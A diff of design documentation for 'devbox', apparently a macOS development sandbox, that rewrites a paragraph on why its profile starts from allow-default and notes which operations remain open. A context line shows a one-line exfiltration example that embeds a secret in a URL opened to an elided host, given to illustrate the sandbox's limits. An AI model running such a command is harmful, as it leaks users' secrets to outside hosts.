@@ -59,17 +59,15 @@ network off by default makes exfiltration only slightly harder: e.g. `open
 "https://.../${SECRET}"` is not blocked. *Don't use devbox to contain serious
 attackers; it won't work.*
 
-Everything that is not a file or a socket - running programs, mach services,
-sysctls - is permitted, bar `TIOCSTI`, because the profile is
-`(allow default)` with
-`file-write*` and `network*` denied inside it and `file-read*` carved into.
-Starting from `(deny default)` instead means naming every operation class dev
-tooling needs - `process-exec`, `mach*`, `sysctl-read`, `file-map-executable`,
-`pseudo-tty` - from an undocumented list that changes between releases.
-(`file-map-executable` arrived in macOS 12 and broke deny-default profiles
-everywhere; miss `pseudo-tty` and `tmux` stops working.) What it would close
-here is `iokit-open`, `nvram*` and the camera and microphone, which TCC governs
-anyway. Not worth a sandbox that breaks every autumn.
+Because the profile is `(allow default)`, almost everything besides files and
+sockets - running programs, mach services, sysctls - is permitted. Starting from
+`(deny default)` instead means naming every operation class dev tooling needs -
+`process-exec`, `mach*`, `sysctl-read`, `file-map-executable`, `pseudo-tty` -
+from an undocumented list that changes between releases. (`file-map-executable`
+arrived in macOS 12 and broke deny-default profiles everywhere; miss
+`pseudo-tty` and `tmux` stops working.) What it would close here is
+`iokit-open`, `nvram*` and the camera and microphone, which TCC governs anyway.
+Not worth a sandbox that breaks every autumn.
 
 ## What it doesn't stop
 
